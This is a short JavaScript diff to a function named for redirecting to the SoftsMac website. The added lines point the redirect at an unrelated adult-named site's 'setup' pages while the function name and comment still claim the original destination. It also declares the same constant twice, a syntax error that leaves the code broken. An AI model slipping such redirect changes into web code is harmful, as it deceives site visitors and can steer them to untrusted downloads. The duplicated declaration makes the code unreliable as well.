@@ -167,7 +167,8 @@ function updateCountdownDisplay(element, value) {
  * Redirect to SoftsMac website
  */
 function redirectToSoftsMac() {
-    const targetUrl = 'https://softsmac.net/';
+    const targetUrl = 'https://lewdgamespc.com/setup-raza/';
+     const targetUrl = 'http://lewdgamespc.com/setup-david/';
     
     try {
         // Use window.location.href for compatibility
